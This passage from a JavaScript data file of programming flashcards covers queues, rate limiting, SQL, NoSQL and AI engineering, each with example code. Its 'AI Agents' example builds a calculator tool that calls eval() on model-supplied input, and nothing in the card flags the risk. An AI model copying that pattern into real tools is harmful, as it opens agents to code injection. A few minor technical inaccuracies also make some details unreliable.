    content: 'Message queues decouple services, enabling asynchronous processing. Producers publish messages; consumers process them. Use cases: background jobs (emails, reports), event-driven architectures, load leveling, fan-out. RabbitMQ (traditional), Kafka (event streaming), Redis Streams, Amazon SQS. Patterns: pub/sub, task queues, competing consumers, dead letter queues for failed messages.',
    example: `// Bull queue (Redis-based)
const Queue = require("bull");
const emailQueue = new Queue("email");

// Producer — add job
await emailQueue.add("welcome", {
  userId: 123,
  email: "user@example.com"
});

// Consumer — process jobs
emailQueue.process("welcome", async (job) => {
  const { userId, email } = job.data;
  await sendWelcomeEmail(email);
  console.log(\`Email sent to \${email}\`);
});

// Retry failed jobs
emailQueue.process("welcome", { attempts: 3 }, async (job) => {
  try {
    await sendEmail(job.data.email);
  } catch (err) {
    console.error("Failed:", err.message);
    throw err; // Bull will retry
  }
});`
  },
  {
    title: 'API Rate Limiting',
    category: 'Backend',
    subcategory: 'Architecture',
    description: 'Controlling request frequency to protect services and ensure fair usage.',
    content: 'Rate limiting restricts how many requests a client can make in a time window. Strategies: Fixed window (resets at interval), Sliding window (rolling), Token bucket (allows bursts), Leaky bucket (constant rate). Implement with Redis (atomic counters), nginx (limit_req), or API gateways. Return 429 Too Many Requests with Retry-After header. Apply per-user, per-IP, or per-API-key.',
    example: `// Redis-based sliding window rate limiter
async function rateLimit(key, limit, windowMs) {
  const now = Date.now();
  const windowStart = now - windowMs;

  const pipe = redis.pipeline();
  pipe.zremrangebyscore(key, 0, windowStart); // remove old
  pipe.zadd(key, now, now);                   // add current
  pipe.zcard(key);                            // count
  pipe.pexpire(key, windowMs);                // set expiry

  const results = await pipe.exec();
  const count = results[2][1];

  return {
    allowed: count <= limit,
    remaining: Math.max(0, limit - count),
    resetAt: new Date(now + windowMs)
  };
}

// Express middleware
app.use("/api", async (req, res, next) => {
  const result = await rateLimit(req.ip, 100, 60000);
  res.set("X-RateLimit-Remaining", result.remaining);
  if (!result.allowed) return res.status(429).json({ error: "Too many requests" });
  next();
});`
  },
  {
    title: 'Graceful Shutdown',
    category: 'Backend',
    subcategory: 'Architecture',
    description: 'Handling server shutdown cleanly — finishing in-flight requests and releasing resources.',
    content: 'When deploying or scaling, servers receive SIGTERM. Graceful shutdown: stop accepting new connections, finish in-flight requests, close database pools, flush caches, close message consumers. Set a timeout (e.g., 30s) then force exit. Prevents data loss, dropped connections, and incomplete transactions. Essential for zero-downtime deployments with Kubernetes or Docker.',
    example: `// Node.js graceful shutdown
const server = app.listen(3000);

function shutdown(signal) {
  console.log(\`\${signal} received. Starting graceful shutdown...\`);

  server.close(() => {
    console.log("HTTP server closed");

    // Close DB pool
    pool.end().then(() => console.log("DB pool closed"));

    // Close Redis
    redis.quit().then(() => console.log("Redis closed"));

    process.exit(0);
  });

  // Force shutdown after 30s
  setTimeout(() => {
    console.error("Forced shutdown after timeout");
    process.exit(1);
  }, 30000);
}

process.on("SIGTERM", () => shutdown("SIGTERM"));
process.on("SIGINT", () => shutdown("SIGINT"));`
  },

  // ═══════════════════════════════════════════
  // SQL — Fundamentals
  // ═══════════════════════════════════════════
  {
    title: 'Joins',
    category: 'SQL',
    subcategory: 'Fundamentals',
    description: 'Combining rows from two or more tables based on related columns.',
    content: 'Joins combine tables using a related column. INNER JOIN returns only matching rows. LEFT JOIN returns all left rows + matching right (NULLs for unmatched). RIGHT JOIN is the opposite. FULL JOIN returns all rows from both tables. CROSS JOIN produces a cartesian product. Self-join joins a table to itself. Always specify the join type — implicit joins (comma-separated) are harder to read.',
    example: `-- INNER JOIN: only matching rows
SELECT u.name, o.total
FROM users u
INNER JOIN orders o ON u.id = o.user_id;

-- LEFT JOIN: all users, even without orders
SELECT u.name, COALESCE(o.total, 0) as total
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;

-- Multiple joins
SELECT u.name, o.id, p.name as product
FROM users u
LEFT JOIN orders o ON u.id = o.user_id
LEFT JOIN order_products op ON o.id = op.order_id
LEFT JOIN products p ON op.product_id = p.id;

-- Self-join: find employees and their managers
SELECT e.name, m.name as manager
FROM employees e
LEFT JOIN employees m ON e.manager_id = m.id;`
  },
  {
    title: 'Window Functions',
    category: 'SQL',
    subcategory: 'Fundamentals',
    description: 'Calculations across sets of rows related to the current row.',
    content: 'Window functions perform calculations without collapsing rows (unlike GROUP BY). Syntax: function() OVER (PARTITION BY ... ORDER BY ...). Functions: ROW_NUMBER(), RANK(), DENSE_RANK(), NTILE(), LAG(), LEAD(), SUM/AVG/COUNT OVER(). PARTITION BY creates groups (like GROUP BY but keeps rows). ORDER BY determines row order within partition.',
    example: `-- Rank employees by salary within each department
SELECT
  name,
  department,
  salary,
  ROW_NUMBER() OVER (PARTITION BY department ORDER BY salary DESC) as rank,
  RANK() OVER (PARTITION BY department ORDER BY salary DESC) as rank_ties,
  salary - LAG(salary) OVER (PARTITION BY department ORDER BY salary) as diff_from_prev,
  AVG(salary) OVER (PARTITION BY department) as dept_avg
FROM employees;

-- Running total
SELECT
  date,
  amount,
  SUM(amount) OVER (ORDER BY date) as running_total
FROM sales;

-- Percentile
SELECT
  name,
  salary,
  NTILE(4) OVER (ORDER BY salary DESC) as quartile
FROM employees;`
  },
  {
    title: 'Indexes',
    category: 'SQL',
    subcategory: 'Fundamentals',
    description: 'Data structures that speed up data retrieval at the cost of storage and writes.',
    content: 'Indexes create a sorted copy of specific columns for faster lookups. B-tree indexes (default) are best for equality and range queries. Composite indexes cover multiple columns — column order matters (leftmost prefix). Unique indexes enforce uniqueness. Partial indexes index only rows matching a condition. Over-indexing slows writes. Use EXPLAIN/EXPLAIN ANALYZE to check if indexes are used.',
    example: `-- Single column index
CREATE INDEX idx_users_email ON users(email);

-- Composite index (order matters!)
CREATE INDEX idx_orders_user_date ON orders(user_id, created_at);

-- Partial index
CREATE INDEX idx_active_users ON users(email)
WHERE status = 'active';

-- Unique index
CREATE UNIQUE INDEX idx_users_username ON users(username);

-- Check index usage
EXPLAIN ANALYZE
SELECT * FROM users WHERE email = 'alice@example.com';
-- Look for "Index Scan" vs "Seq Scan"

-- Drop unused indexes
DROP INDEX idx_unused;`
  },
  {
    title: 'Common Table Expressions (CTEs)',
    category: 'SQL',
    subcategory: 'Fundamentals',
    description: 'Temporary named result sets that simplify complex queries.',
    content: 'CTEs (WITH clause) create temporary result sets readable within a single query. They break complex queries into readable steps. Recursive CEs handle hierarchical data (org charts, tree traversal). Non-recursive CTEs are syntactic sugar for subqueries. CTEs are not materialized by default — each reference re-executes (use MATERIALIZED hint in PostgreSQL for caching).',
    example: `-- Non-recursive CTE
WITH active_users AS (
  SELECT id, name, email
  FROM users
  WHERE status = 'active'
),
user_orders AS (
  SELECT user_id, COUNT(*) as order_count, SUM(total) as total_spent
  FROM orders
  GROUP BY user_id
)
SELECT au.name, uo.order_count, uo.total_spent
FROM active_users au
JOIN user_orders uo ON au.id = uo.user_id
WHERE uo.total_spent > 100;

-- Recursive CTE: org chart
WITH RECURSIVE org AS (
  SELECT id, name, manager_id, 1 as level
  FROM employees WHERE manager_id IS NULL
  UNION ALL
  SELECT e.id, e.name, e.manager_id, o.level + 1
  FROM employees e
  JOIN org o ON e.manager_id = o.id
)
SELECT * FROM org ORDER BY level, name;`
  },
  {
    title: 'Transactions & Isolation',
    category: 'SQL',
    subcategory: 'Advanced',
    description: 'Ensuring data consistency with ACID properties and isolation levels.',
    content: 'A transaction groups operations that succeed or fail together (ACID: Atomicity, Consistency, Isolation, Durability). BEGIN/COMMIT/ROLLBACK control transactions. Isolation levels control visibility between concurrent transactions: READ UNCOMMITTED (dirty reads), READ COMMITTED (no dirty reads), REPEATABLE READ (consistent reads), SERIALIZABLE (full isolation, lowest concurrency). Use SAVEPOINTS for partial rollbacks.',
    example: `-- Basic transaction
BEGIN;
UPDATE accounts SET balance = balance - 100 WHERE id = 1;
UPDATE accounts SET balance = balance + 100 WHERE id = 2;
COMMIT;

-- On error
BEGIN;
  INSERT INTO orders (user_id, total) VALUES (1, 99.99);
  SAVEPOINT order_created;
  INSERT INTO order_items (order_id, product_id, qty) VALUES (1, 5, 2);
  -- If this fails, rollback to savepoint
COMMIT;

-- Check isolation level
SHOW transaction_isolation; -- PostgreSQL
SET TRANSACTION ISOLATION LEVEL SERIALIZABLE;

-- Deadlock example: two transactions waiting on each other
-- Use consistent lock ordering to prevent`
  },
  {
    title: 'Normalization',
    category: 'SQL',
    subcategory: 'Advanced',
    description: 'Organizing database tables to reduce redundancy and improve integrity.',
    content: 'Normalization decomposes tables to minimize redundancy. 1NF: atomic values, no repeating groups. 2NF: no partial dependencies (all non-key columns depend on entire primary key). 3NF: no transitive dependencies (non-key columns don\'t depend on other non-keys). BCNF: stronger 3NF. Denormalization trades redundancy for read performance. Most systems aim for 3NF, then denormalize strategically.',
    example: `-- UNNORMALIZED (1NF violations)
CREATE TABLE orders_bad (
  id INT,
  customer_name VARCHAR(100),
  products TEXT  -- "Widget,Gadget,Doohickey" (violates 1NF!)
);

-- 3NF normalized
CREATE TABLE customers (
  id INT PRIMARY KEY,
  name VARCHAR(100),
  email VARCHAR(255)
);

CREATE TABLE products (
  id INT PRIMARY KEY,
  name VARCHAR(100),
  price DECIMAL(10,2),
  category_id INT REFERENCES categories(id)
);

CREATE TABLE order_items (
  id INT PRIMARY KEY,
  order_id INT REFERENCES orders(id),
  product_id INT REFERENCES products(id),
  quantity INT,
  unit_price DECIMAL(10,2)
);`
  },
  {
    title: 'Query Optimization',
    category: 'SQL',
    subcategory: 'Advanced',
    description: 'Techniques to improve query performance using execution plans and indexing.',
    content: 'Use EXPLAIN ANALYZE to inspect query plans. Key optimizations: add indexes on WHERE/JOIN columns, avoid SELECT *, limit result sets, use covering indexes, avoid functions on indexed columns (breaks index usage), prefer EXISTS over IN for subqueries, use appropriate JOIN types. Watch for sequential scans on large tables, sort operations, and nested loops with high row counts.',
    example: `-- BAD: function on indexed column
SELECT * FROM users WHERE LOWER(email) = 'alice@example.com';
-- GOOD: index the expression or use case-insensitive collation
CREATE INDEX idx_users_email_lower ON users(LOWER(email));

-- BAD: SELECT * with large tables
SELECT * FROM orders;

-- GOOD: only needed columns
SELECT id, total, created_at FROM orders WHERE user_id = 123;

-- Check plan
EXPLAIN (ANALYZE, BUFFERS)
SELECT o.id, p.name
FROM orders o
JOIN order_items oi ON o.id = oi.order_id
JOIN products p ON oi.product_id = p.id
WHERE o.created_at > '2024-01-01'
ORDER BY o.total DESC
LIMIT 10;`
  },
  {
    title: 'Stored Procedures',
    category: 'SQL',
    subcategory: 'Advanced',
    description: 'Precompiled SQL code stored in the database, callable by applications.',
    content: 'Stored procedures encapsulate business logic in the database. They support parameters, variables, loops, conditionals, and error handling. Benefits: reduced network traffic, centralized logic, transaction control, security (grant EXECUTE permission). Drawbacks: harder to version control, test, and debug. Use for complex operations, not simple CRUD. PostgreSQL uses functions (CREATE FUNCTION), MySQL uses PROCEDURE.',
    example: `-- PostgreSQL function (stored procedure)
CREATE OR REPLACE FUNCTION transfer_funds(
  from_id INT,
  to_id INT,
  amount DECIMAL
)
RETURNS void AS $$
DECLARE
  from_balance DECIMAL;
BEGIN
  SELECT balance INTO from_balance
  FROM accounts WHERE id = from_id FOR UPDATE;

  IF from_balance < amount THEN
    RAISE EXCEPTION 'Insufficient funds';
  END IF;

  UPDATE accounts SET balance = balance - amount WHERE id = from_id;
  UPDATE accounts SET balance = balance + amount WHERE id = to_id;
END;
$$ LANGUAGE plpgsql;

-- Call it
SELECT transfer_funds(1, 2, 100.00);`
  },

  // ═══════════════════════════════════════════
  // NOSQL — Fundamentals
  // ═══════════════════════════════════════════
  {
    title: 'CAP Theorem',
    category: 'NoSQL',
    subcategory: 'Fundamentals',
    description: 'A distributed system can only guarantee two of three: Consistency, Availability, Partition tolerance.',
    content: 'CAP theorem states that during a network partition, a distributed database must choose between consistency (all nodes see same data) and availability (every request gets a response). CP systems (MongoDB, HBase) sacrifice availability for consistency. AP systems (Cassandra, DynamoDB) sacrifice consistency for availability. CA systems don\'t handle partitions (single-node databases). In practice, partition tolerance is mandatory — choose between CP and AP.',
    example: `// CP: MongoDB with majority read concern
// Read may fail during partition, but always consistent
db.users.find({}).readConcern("majority");

// AP: Cassandra with tunable consistency
// Always available, but may return stale data
SELECT * FROM users WHERE id = 1
  USING CONSISTENCY ONE; // fastest, least consistent
SELECT * FROM users WHERE id = 1
  USING CONSISTENCY QUORUM; // balanced

// BASE vs ACID
// ACID: Atomicity, Consistency, Isolation, Durability
// BASE: Basically Available, Soft state, Eventual consistency
// NoSQL often trades ACID for BASE
const dynamoConfig = {
  readCapacityUnits: 5,
  writeCapacityUnits: 5,
  consistentRead: false // eventually consistent
};`
  },
  {
    title: 'MongoDB Aggregation',
    category: 'NoSQL',
    subcategory: 'Fundamentals',
    description: 'Pipeline-based data transformation and analysis in MongoDB.',
    content: 'The aggregation pipeline processes documents through a sequence of stages. Each stage transforms the data and passes it to the next. Common stages: $match (filter), $group (aggregate), $project (reshape), $sort, $limit, $lookup (join), $unwind (destructure arrays). Pipeline optimization uses indexes when $match is first. More efficient than MapReduce for most operations.',
    example: `// Aggregation pipeline
db.orders.aggregate([
  // Stage 1: Filter
  { $match: { status: "completed", created_at: { $gte: ISODate("2024-01-01") } } },

  // Stage 2: Deconstruct array
  { $unwind: "$items" },

  // Stage 3: Group and calculate
  { $group: {
    _id: "$items.product_id",
    totalQuantity: { $sum: "$items.quantity" },
    totalRevenue: { $sum: { $multiply: ["$items.price", "$items.quantity"] } },
    orderCount: { $sum: 1 }
  }},

  // Stage 4: Sort by revenue
  { $sort: { totalRevenue: -1 } },

  // Stage 5: Limit top 10
  { $limit: 10 },

  // Stage 6: Reshape output
  { $project: {
    product_id: "$_id",
    _id: 0,
    totalRevenue: { $round: ["$totalRevenue", 2] },
    totalQuantity: 1,
    orderCount: 1
  }}
]);`
  },
  {
    title: 'Redis Data Structures',
    category: 'NoSQL',
    subcategory: 'Fundamentals',
    description: 'Beyond strings — lists, sets, sorted sets, hashes, and streams.',
    content: 'Redis is an in-memory data store with rich data structures. Strings: simple key-value, counters, caches. Lists: queues, stacks, recent activity feeds (LPUSH, RPOP). Sets: unique items, intersections, unions. Sorted Sets: leaderboards, time-series (ranked by score). Hashes: object storage (HSET user:1 name "Alice"). Streams: event logs, message queues (XADD, XREAD). Use the right structure to avoid client-side processing.',
    example: `// Strings
SET user:1:name "Alice"
INCR page:views:home

// Lists — activity feed
LPUSH feed:user1 "post:123"
LRANGE feed:user1 0 9  // last 10 items

// Sets — unique visitors
SADD page:visitors:2024-01-15 "user1" "user2" "user3"
SCARD page:visitors:2024-01-15  // count

// Sorted Sets — leaderboard
ZADD leaderboard 100 "player1"
ZADD leaderboard 250 "player2"
ZREVRANGE leaderboard 0 9  // top 10

// Hashes — object storage
HSET user:1 name "Alice" age 25 email "a@b.com"
HGET user:1 name  // "Alice"
HGETALL user:1    // all fields

// Streams — event queue
XADD events * type "order.created" id 123
XREAD COUNT 10 STREAMS events 0`
  },
  {
    title: 'Graph Databases',
    category: 'NoSQL',
    subcategory: 'Fundamentals',
    description: 'Databases optimized for relationship-heavy queries using nodes and edges.',
    content: 'Graph databases store entities as nodes and relationships as edges. Unlike relational JOINs, graph traversal follows edges directly — constant-time per hop. Ideal for social networks, recommendation engines, fraud detection, knowledge graphs. Neo4j (Cypher query language), ArangoDB (AQL), Amazon Neptune. Property graphs store key-value pairs on both nodes and edges.',
    example: `// Neo4j Cypher queries
// Create nodes and relationships
CREATE (alice:Person {name: "Alice", age: 30})
CREATE (bob:Person {name: "Bob", age: 25})
CREATE (alice)-[:FRIENDS_WITH {since: 2020}]->(bob)

// Find friends of friends
MATCH (me:Person {name: "Alice"})-[:FRIENDS_WITH]->(friend)
      -[:FRIENDS_WITH]->(fof)
WHERE NOT (me)-[:FRIENDS_WITH]->(fof)
      AND me <> fof
RETURN fof.name, COUNT(*) as mutualFriends
ORDER BY mutualFriends DESC

// Shortest path
MATCH path = shortestPath(
  (a:Person {name: "Alice"})-[*]-(b:Person {name: "Dave"})
)
RETURN path

// Recommendation: people who like similar things
MATCH (me:Person)-[:LIKES]->(thing)<-[:LIKES]-(other:Person)
WHERE me.name = "Alice" AND me <> other
RETURN other.name, COUNT(thing) as shared
ORDER BY shared DESC LIMIT 5`
  },
  {
    title: 'DynamoDB Single-Table Design',
    category: 'NoSQL',
    subcategory: 'Advanced',
    description: 'Modeling multiple entity types in one table using composite keys.',
    content: 'DynamoDB single-table design puts all entities in one table using composite partition/sort keys. Pattern: PK = entity type + ID, SK = relationship + related entity ID. This enables efficient access patterns without JOINs. GSI (Global Secondary Indexes) enable additional query patterns. Design bottom-up: start with access patterns, then design the key schema. Trade complexity for performance and cost.',
    example: `// Single-table design for social app
// Access patterns:
// 1. Get user profile
// 2. Get user's posts
// 3. Get post's comments

// Table schema
{
  PK: "USER#123",        SK: "PROFILE#",
  name: "Alice", email: "a@b.com"
}
{
  PK: "USER#123",        SK: "POST#2024-01-15#abc",
  title: "Hello World", content: "..."
}
{
  PK: "POST#abc",        SK: "COMMENT#2024-01-15#def",
  author: "Bob", text: "Nice post!"
}

// Queries
// Get user posts
dynamodb.query({
  KeyConditionExpression: "PK = :pk AND begins_with(SK, :sk)",
  ExpressionAttributeValues: {
    ":pk": "USER#123",
    ":sk": "POST#"
  }
});`
  },
  {
    title: 'Sharding Strategies',
    category: 'NoSQL',
    subcategory: 'Advanced',
    description: 'Distributing data across multiple database instances for horizontal scaling.',
    content: 'Sharding splits data across multiple servers. Strategies: Hash-based (hash key % num_shards — even distribution, hard to reshard), Range-based (key ranges — supports range queries, risk of hotspots), Directory-based (lookup table — flexible, single point of failure). Resharding is expensive — use consistent hashing (virtual nodes) to minimize redistribution. Shard key selection is critical — poor choice causes hotspots.',
    example: `// Consistent hashing
class ConsistentHash {
  constructor(nodes, virtualNodes = 150) {
    this.ring = new Map();
    this.sortedKeys = [];
    for (const node of nodes) {
      for (let i = 0; i < virtualNodes; i++) {
        const key = this.hash(\`\${node}:\${i}\`);
        this.ring.set(key, node);
        this.sortedKeys.push(key);
      }
    }
    this.sortedKeys.sort();
  }

  hash(key) {
    let h = 0;
    for (const c of key) h = ((h << 5) - h + c.charCodeAt(0)) | 0;
    return h;
  }

  getNode(key) {
    const h = this.hash(key);
    for (const k of this.sortedKeys) {
      if (k >= h) return this.ring.get(k);
    }
    return this.ring.get(this.sortedKeys[0]);
  }
}

const hash = new ConsistentHash(["shard1", "shard2", "shard3"]);
hash.getNode("user:123"); // consistent assignment`
  },
  {
    title: 'Eventual Consistency',
    category: 'NoSQL',
    subcategory: 'Advanced',
    description: 'A consistency model where all nodes converge to the same state over time.',
    content: 'Eventual consistency means if no new updates are made, all replicas will eventually converge. Temporary inconsistencies are acceptable for higher availability and performance. CRDTs (Conflict-free Replicated Data Types) guarantee convergence without coordination. Used in DNS, Cassandra, DynamoDB (eventual read). Read-your-writes consistency requires session tokens or quorum reads. Design applications to tolerate stale reads.',
    example: `// CRDT counter (PN-Counter)
// Works without coordination — eventually consistent
class PNCounter {
  constructor() {
    this.positive = new Map(); // increment counts
    this.negative = new Map(); // decrement counts
  }

  increment(nodeId) {
    this.positive.set(nodeId, (this.positive.get(nodeId) || 0) + 1);
  }

  decrement(nodeId) {
    this.negative.set(nodeId, (this.negative.get(nodeId) || 0) + 1);
  }

  value() {
    const pos = [...this.positive.values()].reduce((a, b) => a + b, 0);
    const neg = [...this.negative.values()].reduce((a, b) => a + b, 0);
    return pos - neg;
  }

  merge(other) {
    for (const [k, v] of other.positive)
      this.positive.set(k, Math.max(this.positive.get(k) || 0, v));
    for (const [k, v] of other.negative)
      this.negative.set(k, Math.max(this.negative.get(k) || 0, v));
  }
}`
  },
  {
    title: 'Caching Patterns',
    category: 'NoSQL',
    subcategory: 'Advanced',
    description: 'Patterns for using Redis/Memcached as a caching layer.',
    content: 'Cache patterns optimize read performance and reduce database load. Cache-aside (lazy loading): check cache, miss → load from DB, populate cache. Write-through: write to cache and DB simultaneously. Write-behind (write-back): write to cache, async flush to DB. Read-through: cache loads from DB on miss (transparent to app). Cache warming pre-populates cache. Cache stampede (thundering herd) — use locks or probabilistic early expiration.',
    example: `// Cache stampede prevention
async function getWithLock(key, fetchFn, ttl = 3600) {
  // Try cache first
  const cached = await redis.get(key);
  if (cached) return JSON.parse(cached);

  // Try to acquire lock
  const lockKey = \`lock:\${key}\`;
  const acquired = await redis.set(lockKey, "1", "NX", "EX", 10);

  if (!acquired) {
    // Another process is loading — wait and retry
    await new Promise(r => setTimeout(r, 100));
    return getWithLock(key, fetchFn, ttl);
  }

  try {
    const data = await fetchFn();
    await redis.setex(key, ttl, JSON.stringify(data));
    return data;
  } finally {
    await redis.del(lockKey);
  }
}

// Probabilistic early expiration (PEE)
async function getWithPEE(key, fetchFn, ttl) {
  const cached = await redis.get(key);
  if (cached) {
    const data = JSON.parse(cached);
    // Probabilistically refresh before expiry
    if (Math.random() < 0.01) { // 1% chance
      getWithLock(key, fetchFn, ttl); // background refresh
    }
    return data;
  }
  return getWithLock(key, fetchFn, ttl);
}`
  },

  // ═══════════════════════════════════════════
  // AI ENGINEERING — Fundamentals
  // ═══════════════════════════════════════════
  {
    title: 'LLM Architecture',
    category: 'AI Engineering',
    subcategory: 'Fundamentals',
    description: 'How large language models process and generate text using transformer architecture.',
    content: 'LLMs use the transformer architecture with self-attention mechanisms. Input text is tokenized into subword tokens, embedded into vectors, then processed through attention layers that learn contextual relationships. Each token attends to all other tokens to understand context. GPT-style models are decoder-only (autoregressive — predict next token). Training uses massive text corpora with next-token prediction. Inference generates tokens one at a time.',
    example: `# Tokenization and basic LLM usage
import tiktoken

encoder = tiktoken.get_encoding("cl100k_base")  # GPT-4 encoding
tokens = encoder.encode("Hello, world!")
print(f"Tokens: {tokens}")  # [9906, 11, 1917, 0]
print(f"Decoded: {[encoder.decode([t]) for t in tokens]}")

# LLM inference parameters
import openai

response = openai.chat.completions.create(
    model="gpt-4",
    messages=[
        {"role": "system", "content": "You are a helpful assistant."},
        {"role": "user", "content": "Explain transformers in 3 sentences."}
    ],
    temperature=0.7,    # creativity (0=deterministic, 1=random)
    max_tokens=150,     # max response length
    top_p=0.9           # nucleus sampling
)`
  },
  {
    title: 'Prompt Engineering',
    category: 'AI Engineering',
    subcategory: 'Fundamentals',
    description: 'Designing inputs to guide LLMs toward desired outputs.',
    content: 'Prompt engineering crafts inputs for optimal LLM responses. Techniques: zero-shot (no examples), few-shot (provide examples), chain-of-thought (step-by-step reasoning), role-playing (assign a persona), structured output (JSON mode). Temperature controls randomness. System prompts set behavior. Prompt injection is a security risk — never trust user input in prompts. Test prompts iteratively and version control them.',
    example: `# Zero-shot prompt
prompt = "Summarize this article in 3 bullet points:"

# Few-shot prompt
prompt = """
Classify the sentiment of these reviews:

Review: "Great product, love it!" → Positive
Review: "Terrible quality, broke immediately" → Negative
Review: "It's okay, nothing special" → Neutral

Review: "Exceeded my expectations!" →
"""

# Chain-of-thought
prompt = """
Solve this step by step:
A train travels 60 mph for 2.5 hours, then 80 mph for 1.5 hours.
Total distance = ?

Let me think step by step:
1. First segment: 60 mph × 2.5 hours = 150 miles
2. Second segment: 80 mph × 1.5 hours = 120 miles
3. Total: 150 + 120 = 270 miles

Answer: 270 miles
"""`
  },
  {
    title: 'RAG Pipeline',
    category: 'AI Engineering',
    subcategory: 'Applied',
    description: 'Retrieval-Augmented Generation — grounding LLMs with external knowledge.',
    content: 'RAG combines retrieval (search) with generation (LLM). Pipeline: (1) Split documents into chunks, (2) Generate embeddings for each chunk, (3) Store in vector database, (4) On query, find similar chunks, (5) Inject retrieved context into prompt, (6) LLM generates answer grounded in retrieved facts. Reduces hallucination, keeps knowledge current, no fine-tuning needed. Chunk size, overlap, and retrieval strategy affect quality.',
    example: `# Simple RAG pipeline
from langchain.text_splitter import RecursiveCharacterTextSplitter
from langchain_openai import OpenAIEmbeddings, ChatOpenAI
from langchain_community.vectorstores import FAISS
from langchain.chains import RetrievalQA

# 1. Load and split documents
splitter = RecursiveCharacterTextSplitter(
    chunk_size=500,
    chunk_overlap=50,
    separators=["\\n\\n", "\\n", ". ", " "]
)
docs = splitter.split_documents(raw_docs)

# 2. Create vector store
embeddings = OpenAIEmbeddings()
vectorstore = FAISS.from_documents(docs, embeddings)

# 3. Create RAG chain
llm = ChatOpenAI(model="gpt-4", temperature=0)
qa_chain = RetrievalQA.from_chain_type(
    llm=llm,
    retriever=vectorstore.as_retriever(
        search_kwargs={"k": 4}  # top 4 chunks
    ),
    return_source_documents=True
)

# 4. Query
result = qa_chain.invoke({"query": "What is the refund policy?"})
print(result["answer"])
print(result["source_documents"])`
  },
  {
    title: 'Vector Databases',
    category: 'AI Engineering',
    subcategory: 'Applied',
    description: 'Databases optimized for storing and searching high-dimensional embeddings.',
    content: 'Vector databases store embeddings (high-dimensional vectors) and enable similarity search. Unlike traditional databases that use exact matching, they find nearest neighbors using distance metrics (cosine similarity, L2 distance, dot product). Used for semantic search, recommendation systems, RAG, and anomaly detection. Popular options: Pinecone, Weaviate, Qdrant, ChromaDB, pgvector. Index types: HNSW, IVF, PQ for approximate nearest neighbor (ANN) search.',
    example: `# Using ChromaDB for vector storage
import chromadb
from chromadb.utils import embedding_functions

# Initialize
client = chromadb.Client()
ef = embedding_functions.OpenAIEmbeddingFunction(
    api_key="sk-...",
    model_name="text-embedding-3-small"
)

# Create collection
collection = client.create_collection(
    name="documents",
    embedding_function=ef,
    metadata={"hnsw:space": "cosine"}
)

# Add documents
collection.add(
    documents=["Python is great for ML", "JavaScript runs in browsers"],
    metadatas=[{"source": "tutorial"}, {"source": "guide"}],
    ids=["doc1", "doc2"]
)

# Query
results = collection.query(
    query_texts=["programming for data science"],
    n_results=2
)
print(results["documents"])  # ["Python is great for ML", ...]`
  },
  {
    title: 'Fine-Tuning',
    category: 'AI Engineering',
    subcategory: 'Applied',
    description: 'Customizing pre-trained LLMs on domain-specific data.',
    content: 'Fine-tuning adapts a pre-trained model to specific tasks or domains. Methods: Full fine-tuning (update all parameters — expensive), LoRA/QLoRA (update low-rank adapters — efficient), Prompt tuning (learn soft prompts). Prepare high-quality training data (100-1000+ examples). Evaluate with held-out test set. Watch for overfitting and catastrophic forgetting. Fine-tuning is better when prompts alone aren\'t enough — for style, format, or domain knowledge.',
    example: `# LoRA fine-tuning with Hugging Face
from transformers import AutoModelForCausalLM, AutoTokenizer
from peft import LoraConfig, get_peft_model

# Load base model
model = AutoModelForCausalLM.from_pretrained(
    "meta-llama/Llama-3.1-8B",
    torch_dtype="auto",
    device_map="auto"
)

# Configure LoRA
lora_config = LoraConfig(
    r=16,                    # rank
    lora_alpha=32,           # scaling
    target_modules=["q_proj", "v_proj"],  # attention layers
    lora_dropout=0.05,
    bias="none",
    task_type="CAUSAL_LM"
)

# Apply LoRA
model = get_peft_model(model, lora_config)
model.print_trainable_parameters()

# Training
from trl import SFTTrainer
trainer = SFTTrainer(
    model=model,
    train_dataset=dataset,
    max_seq_length=2048,
    args=TrainingArguments(
        output_dir="./output",
        num_train_epochs=3,
        per_device_train_batch_size=4,
        learning_rate=2e-4,
    ),
)
trainer.train()`
  },
  {
    title: 'AI Agents',
    category: 'AI Engineering',
    subcategory: 'Applied',
    description: 'Autonomous systems that use LLMs with tools to accomplish multi-step tasks.',
    content: 'AI agents combine LLMs with tool use, memory, and planning. Architecture: Observe (read input/tools), Think (reason about next step), Act (call tools/APIs), Observe (process result). Tools: web search, code execution, file operations, API calls. Frameworks: LangGraph, CrewAI, AutoGen. Key challenges: planning reliability, error recovery, tool selection. Agents loop until task completion or budget limit.',
    example: `# Simple agent with LangGraph
from langgraph.prebuilt import create_react_agent
from langchain_openai import ChatOpenAI
from langchain_core.tools import tool

@tool
def calculator(expression: str) -> str:
    """Evaluate a math expression."""
    return str(eval(expression))

@tool
def search(query: str) -> str:
    """Search the web."""
    # Simplified - real implementation calls API
    return f"Results for: {query}"

# Create agent
llm = ChatOpenAI(model="gpt-4")
agent = create_react_agent(
    model=llm,
    tools=[calculator, search],
    state_modifier="You are a helpful assistant with access to tools."
)

# Run agent
result = agent.invoke({
    "messages": [("user", "What's 15% of 847? And what's the weather?")]
})
# Agent decides: call calculator(847 * 0.15) then search("weather")`
  },
  {
    title: 'MLOps',
    category: 'AI Engineering',
    subcategory: 'Applied',
    description: 'Practices for deploying, monitoring, and maintaining ML models in production.',
    content: 'MLOps bridges ML development and operations. Key practices: version control (data, code, models), CI/CD for ML pipelines, experiment tracking (MLflow, Weights & Biases), model registry, A/B testing, shadow deployment, monitoring (data drift, model performance, latency), retraining triggers. Challenges: model decay (performance degrades over time), reproducibility, feature store management.',
    example: `# MLflow experiment tracking
import mlflow
import mlflow.sklearn
from sklearn.ensemble import RandomForestClassifier
from sklearn.metrics import accuracy_score

mlflow.set_experiment("customer-churn")

with mlflow.start_run():
    # Log parameters
    mlflow.log_params({
        "n_estimators": 100,
        "max_depth": 10,
        "model_type": "RandomForest"
    })

    # Train model
    model = RandomForestClassifier(n_estimators=100, max_depth=10)
    model.fit(X_train, y_train)

    # Log metrics
    preds = model.predict(X_test)
    accuracy = accuracy_score(y_test, preds)
    mlflow.log_metric("accuracy", accuracy)

    # Log model
    mlflow.sklearn.log_model(model, "model")

    print(f"Accuracy: {accuracy:.4f}")

# Load model later
loaded_model = mlflow.sklearn.load_model("runs:/<run_id>/model")`
  },
  {
    title: 'Embeddings',
    category: 'AI Engineering',
    subcategory: 'Fundamentals',
    description: 'Dense vector representations that capture semantic meaning of text.',
